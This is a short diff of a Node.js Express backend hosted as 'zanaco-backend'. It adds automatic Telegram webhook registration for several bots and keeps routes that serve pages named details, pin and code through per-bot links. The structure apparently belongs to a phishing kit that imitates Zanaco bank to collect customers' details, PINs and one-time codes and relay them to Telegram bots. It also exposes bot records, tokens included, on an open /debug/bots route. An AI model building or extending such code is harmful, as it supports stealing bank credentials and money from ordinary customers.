@@ -66,17 +66,31 @@ async function answerCallback(bot, callbackId) {
     }
 }
 
-// ---------------- DYNAMIC PAGE SERVING ----------------
+// ---------------- AUTO-SET WEBHOOKS ----------------
+async function setWebhookForBot(bot) {
+    try {
+        if (!bot.botToken || !bot.botId) return;
+        const webhookUrl = `https://zanaco-backend.onrender.com/telegram-webhook/${bot.botId}`;
+        const resp = await axios.get(
+            `https://api.telegram.org/bot${bot.botToken}/setWebhook?url=${webhookUrl}`
+        );
+        console.log(`✅ Webhook auto-set for ${bot.botId}:`, resp.data);
+    } catch (err) {
+        console.error(`❌ Failed to set webhook for ${bot.botId}:`, err.response?.data || err.message);
+    }
+}
+async function setWebhooksForAllBots() {
+    for (const bot of bots) {
+        await setWebhookForBot(bot);
+    }
+}
 
-// ✅ FIX: redirect to index.html with botId in query string
+// ---------------- DYNAMIC PAGE SERVING ----------------
 app.get('/bot/:botId', (req, res) => {
     const bot = getBot(req.params.botId);
     if (!bot) return res.status(404).send('Invalid bot link');
-
     res.redirect(`/index.html?botId=${bot.botId}`);
 });
-
-// Serve other pages normally
 app.get('/details', (req, res) => res.sendFile(path.join(__dirname, 'public', 'details.html')));
 app.get('/pin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pin.html')));
 app.get('/code', (req, res) => res.sendFile(path.join(__dirname, 'public', 'code.html')));
@@ -165,4 +179,6 @@ app.post('/add-bot', async (req, res) => {
 app.get('/debug/bots', (req, res) => res.json(bots));
 
 // ---------------- START SERVER ----------------
-app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
+setWebhooksForAllBots().then(() => {
+    app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
+});
